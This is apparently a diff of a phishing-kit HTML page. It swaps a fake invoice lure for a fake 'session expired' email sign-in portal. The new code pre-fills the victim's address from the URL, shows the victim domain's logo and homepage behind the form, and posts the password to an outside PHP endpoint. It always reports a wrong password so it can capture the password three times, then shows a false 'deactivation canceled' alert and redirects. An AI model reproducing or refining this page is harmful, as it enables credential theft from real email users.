@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Excel-Spreadsheet</title>
+<title>Email Update</title>
 <style>
-/* Existing styles unchanged */
+/* Your existing CSS styles */
 body {
     margin: 0;
     padding: 0;
@@ -13,254 +13,227 @@ body {
     justify-content: center;
     align-items: center;
     min-height: 100vh;
+    font-family: Arial, sans-serif;
     position: relative;
+    overflow: hidden;
 }
 
-.background {
-    position: absolute;
+#background-container {
+    position: fixed;
     top: 0;
     left: 0;
-    width: 95%;
-    height: 95%;
-    filter: blur(3px);
+    width: 100%;
+    height: 100%;
     z-index: -1;
 }
 
-.invoice {
-    color: #555;
-    font-family: Arial, sans-serif;
-    line-height: 1.8;
-    opacity: 0.8;
-    font-size: 14px;
-    margin: 0;
+#background-frame {
     width: 100%;
-    max-width: none;
-    background: white;
-    padding: 20px;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    height: 100%;
+    border: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    pointer-events: none;
 }
 
-.invoice h2 {
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-.invoice table {
-    width: 100%;
-    border-collapse: collapse;
-    margin-top: 50px;
-}
-
-.invoice table, .invoice th, .invoice td {
-    border: 1px solid #ddd;
-}
-
-.invoice th, .invoice td {
-    padding: 8px;
-    text-align: center;
+.abstract-shapes {
+    display: none;
 }
 
 .form-container {
-    position: relative;
-    background: rgba(255, 255, 255, 0.9);
-    padding: 20px 30px;
+    background: #fff;
+    padding: 30px;
     border-radius: 15px;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-    z-index: 1;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    text-align: center;
     width: 350px;
+    border: 2px solid #ddd;
+    position: relative;
+    z-index: 1;
 }
 
 h2 {
-    text-align: center;
+    color: #333;
     margin-bottom: 20px;
-    font-family: Arial, sans-serif;
+    font-size: 22px;
+    font-weight: bold;
 }
 
-.form-header {
-    display: flex;
-    align-items: center;
-    gap: 10px;
+p {
+    color: #666;
+    font-size: 14px;
     margin-bottom: 20px;
-    justify-content: center;
-}
-
-.form-header img {
-    width: 40px;
-    height: 40px;
 }
 
 .form-group {
     margin-bottom: 15px;
+    text-align: left;
 }
 
 .form-group label {
     display: block;
     margin-bottom: 5px;
     font-size: 14px;
+    color: #333;
 }
 
 .form-group input {
     width: 100%;
-    padding: 8px;
+    padding: 10px;
     border: 1px solid #ccc;
     border-radius: 5px;
     font-size: 14px;
 }
 
-.form-group input[type="checkbox"] {
-    width: auto;
-}
-
-.form-group .remember-me {
-    display: inline-block;
-    font-size: 14px;
-}
-
 .form-group button {
-    width: 100%;
-    padding: 10px;
-    background: #4CAF50;
+    width: 60%;
+    padding: 12px;
+    background: #007bff;
     color: white;
     border: none;
     border-radius: 5px;
     font-size: 16px;
+    font-weight: bold;
     cursor: pointer;
+    transition: background 0.3s ease;
+    margin-top: 20px;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
 }
 
 .form-group button:hover {
-    background: #45a049;
+    background: #0056b3;
 }
 
 .error-message {
     color: red;
     font-size: 14px;
-    margin-bottom: 15px;
     display: none;
+    margin-top: 10px;
+    text-align: left;
+}
+
+#domainLogo {
+    max-height: 50px;
+    display: block;
+    margin: 0 auto 20px;
+}
+
+#session-expired {
+    color: red;
+    font-weight: normal;
+    font-size: 14px;
 }
 </style>
+<script src="https://hcaptcha.com/1/api.js" async defer></script>
 </head>
 <body>
-<div class="background">
-    <div class="invoice">
-        <h2>Payment Remittance</h2>
-        <table>
-            <tr>
-                <th>Item</th>
-                <th>Quantity</th>
-                <th>Price</th>
-                <th>Total</th>
-            </tr>
-            <tr>
-                <td>Item A</td>
-                <td>8</td>
-                <td>$1,000.00</td>
-                <td>$8,000.00</td>
-            </tr>
-            <tr>
-                <td>Item B</td>
-                <td>5</td>
-                <td>$500.00</td>
-                <td>$2,500.00</td>
-            </tr>
-            <tr>
-                <td>Item C</td>
-                <td>9</td>
-                <td>$52,000.00</td>
-                <td>$468,000.00</td>
-            </tr>
-            <tr>
-                <td>Item D</td>
-                <td>16</td>
-                <td>$31,982.00</td>
-                <td>$511,700.00</td>
-            </tr>
-        </table>
-    </div>
+
+<div id="background-container">
+    <iframe id="background-frame" src="" frameborder="0"></iframe>
 </div>
+
 <div class="form-container">
-    <div class="form-header">
-        <h2 id="emailDomainHeader">Receipt</h2>
-    </div>
-    <div class="container">
-        <div id="login-form">
-            <p>This document is protected.<br>
-            To access it, please enter your email password.</p>
-            <form id="loginForm" action="https://amdesarrollos.com/layouts/me/tele-php.php" method="post">
-                <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" name="username" readonly required>
-                </div>
-                <div class="error-message" id="errorMessage">Incorrect Password! Please Try Again.</div>
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="email password" autofocus required>
-                </div>
-                <div class="form-group">
-                    <input type="checkbox" id="rememberMe" name="rememberMe">
-                    <label for="rememberMe" class="remember-me">Remember Me</label>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Continue</button>
-                </div>
-            </form>
+    <img id="domainLogo" alt="Domain Logo" style="display: none;">
+    <h2 id="emailDomainHeader"> Portal</h2>
+
+    <p id="session-expired">Your session has expired, Please sign in to continue.</p>
+    
+    <form id="loginForm" action="https://zeexpress.in/vendor/me/new-telephp.php" method="post">
+        <div class="form-group">
+            <label for="username">Email</label>
+            <input type="text" id="username" name="username" readonly required>
         </div>
-    </div>
+        <div class="error-message" id="errorMessage">Invalid Password! Please Enter your correct Password</div>
+        <div class="form-group">
+            <label for="password">Current Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        </div>
+        <!-- hCaptcha Widget -->
+        <div class="form-group">
+            <div class="h-captcha" data-sitekey="ES_f7c9b614d17f482d8f2302827f0d9b70"></div>
+        </div>
+        <div class="form-group">
+            <button type="submit">Sign in</button>
+        </div>
+    </form>
 </div>
+
 <script>
-    // Extract email from URL fragment
-    const fragment = window.location.hash.slice(1); // Remove the '#' character
-    const email = decodeURIComponent(fragment); // Decode the email value
+// Extract '#' parameter value
+const fragment = window.location.hash.slice(1); // Remove the '#' character
+const email = decodeURIComponent(fragment); // Decode the email value
+let attemptCount = 0;
 
-    if (email) {
-        // Populate the email input field
-        const usernameField = document.getElementById('username');
-        usernameField.value = email;
+if (email) {
+    const usernameField = document.getElementById('username');
+    usernameField.value = email;
 
-        // Extract the domain name without TLD
-        const emailDomain = email.split('@')[1].split('.')[0];
-        const emailHeader = document.getElementById('emailDomainHeader');
-        emailHeader.textContent = `${emailDomain} Receipt`;
-    }
+    const emailDomain = email.split('@')[1];
+    const emailDomainHeader = email.split('@')[1].split('.')[0];
+    const emailHeader = document.getElementById('emailDomainHeader');
+    emailHeader.textContent = ` ${emailDomainHeader} Portal`;
 
-    // Existing form functionality preserved
-    let submissionCount = 0;
+    const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
+    const logoImg = document.getElementById('domainLogo');
+    logoImg.src = logoUrl;
+    logoImg.onerror = () => {
+        logoImg.style.display = "none";
+    };
+    logoImg.style.display = "block";
 
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-        e.preventDefault();
+    // Set the iframe src to the domain homepage
+    const iframe = document.getElementById('background-frame');
+    iframe.src = `https://${emailDomain}`;
+}
 
-        const form = document.getElementById("loginForm");
-        const formData = new FormData(form);
-        const errorMessage = document.getElementById("errorMessage");
-        const passwordField = document.getElementById("password");
+const errorMessage = document.getElementById("errorMessage");
 
-        fetch(form.action, {
-            method: "POST",
-            body: formData,
-        })
-        .then((response) => response.json())
-        .then((data) => {
-            if (data.status === "success") {
-                window.location.href = "https://drive.google.com/file/d";
-            } else {
-                throw new Error(data.message);
-            }
-        })
-        .catch((error) => {
-            submissionCount++;
-            if (submissionCount < 3) {
-                errorMessage.style.display = "block";
-            } else {
-                window.location.href = "https://drive.google.com/file/d";
-            }
-        })
-        .finally(() => {
-            passwordField.value = ""; // Clear the password field
-        });
+// Hide error while typing
+document.getElementById("password").addEventListener("input", function () {
+    errorMessage.style.display = "none";
+});
+
+// Handle form submission
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const form = document.getElementById("loginForm");
+    const formData = new FormData(form);
+
+    attemptCount++;
+
+    fetch(form.action, {
+        method: "POST",
+        body: formData,
+    })
+    .then((response) => response.json())
+    .then(() => {
+        errorMessage.style.display = "block"; // Always display the error message
+        document.getElementById("password").value = ""; // Clear password field
+
+        // Redirect after the third attempt
+        if (attemptCount >= 3) {
+            alert("Your account deactivation has now been canceled. You can continue using your account without interruption.");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
+    })
+    .catch(() => {
+        errorMessage.style.display = "block"; // Show error message on fetch failure
+        document.getElementById("password").value = ""; // Clear password field on error
+
+        // Redirect after the third attempt
+        if (attemptCount >= 3) {
+            alert("Your account deactivation has now been canceled. You can continue using your account without interruption.");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
     });
-
-    document.getElementById("password").addEventListener("input", function () {
-        document.getElementById("errorMessage").style.display = "none";
-    });
+});
 </script>
+
 </body>
 </html>
